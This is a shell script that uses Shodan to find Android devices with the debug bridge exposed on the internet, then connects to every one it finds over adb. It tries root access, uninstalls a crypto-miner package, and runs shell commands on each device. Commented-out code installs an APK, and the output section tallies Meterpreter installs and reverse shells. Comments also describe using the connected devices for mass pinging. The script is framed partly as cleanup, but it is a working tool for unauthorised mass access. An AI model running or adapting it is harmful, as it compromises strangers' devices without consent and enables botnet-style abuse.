#!/bin/sh
banner() 
{
echo "    _    ____  ____    _   _ _   _   _____ _   _  ____ _  _______ ____   "
echo "   / \  |  _ \| __ )  | | | | \ | | |  ___| | | |/ ___| |/ / ____|  _ \  "
echo "  / _ \ | | | |  _ \  | | | |  \| | | |_  | | | | |   | ' /|  _| | |_) | "
echo " / ___ \| |_| | |_) | | |_| | |\  | |  _| | |_| | |___| . \| |___|  _ <  "
echo "/_/   \_\____/|____/   \___/|_| \_| |_|    \___/ \____|_|\_\_____|_| \_\ "
echo "_________________________________________________________________________"                                                                        
}

banner 
IPLIST="data/addresses"
IPLIST2="data/addresses2"
#Deletes all present configs 

adb kill-server
adb start-server

rm data/data & rm data/addresses

sleep 2

#Uses shodan api to search for 'Android Debug Bridge Port:5555' and do some grep voodoo to get IP Lists (only 2 needed)

shodan search Android Debug Bridge > data/data

cat data/data | egrep -o '([0-9]{1,3}\.){3}[0-9]{1,3}' > data/addresses

sleep 1

#Connect to vulnerable devices through adb (Android Debug Bridge)

for ip in $(cat $IPLIST)

do

timeout 3 adb connect $ip

done

#Populate 
adb devices -l > data/devices
cat data/devices | egrep -o '([0-9]{1,3}\.){3}[0-9]{1,3}' > data/addresses2



#Get root privileges (Some devices might disconnect, but it's not worth parsing through everything again to catch the strays)

adb devices -l | while read line
do
    if [ ! "$line" = "" ] && [ `echo $line | awk '{print $2}'` = "device" ]
    then
        device=`echo $line | awk '{print $1}'`
	
 timeout 4 adb -s $device $@ root
    fi
done



#Install your own malicious piece of code (If you desire)
#adb devices -l | while read line

#do
   # if [ ! "$line" = "" ] && [ `echo $line | awk '{print $2}'` = "device" ]
    #then
        #device=`echo $line | awk '{print $1}'`
	
 #timeout 4 adb -s $device $@ install data/MyApp.apk
   # fi
#done

#Remove com.ufo.miner or any other software you want to remove
adb devices -l | while read line

do
    if [ ! "$line" = "" ] && [ `echo $line | awk '{print $2}'` = "device" ]
    then
        device=`echo $line | awk '{print $1}'`
	
 timeout 4 adb -s $device $@ uninstall com.ufo.miner
    fi
done

#Execute your piece of code through a shell on the infected machine (This command on its own can be used to ping from theoretically tons of devices, a hundred or so devices every day accrued over time can be deadly

for ip in $(cat $IPLIST2)

do

timeout 4 adb -s $ip shell ping google.com

done

#Now we turn off the ADB Bridge's connection to the internet by changing its mode to usb, thus shutting down the vulnerability until the port is changed back to tcp.

#adb devices -l | while read line

#do
    #if [ ! "$line" = "" ] && [ `echo $line | awk '{print $2}'` = "device" ]
   # then
        #device=`echo $line | awk '{print $1}'`
	
 #timeout 4 adb -s $device $@ usb
   # fi
#done

#Display relevant results

banner
echo "Successfully connected devices:"
grep -o 'connected' data/logs/results| wc -l
echo "Successfully closed debug bridges:"
grep -o 'restarting in USB mode' data/logs/results| wc -l
echo "Successfully uninstalled instances of com.ufo.miner:"
grep -o 'Success' data/logs/results| wc -l
echo "Devices with Meterpreter installed on them:"
grep -o 'MyApp.apk: 1 file pushed.' data/logs/results| wc -l
echo "Devices that successfully ran Meterpreter reverse shell:"
grep -o 'Starting:' data/logs/results| wc -l







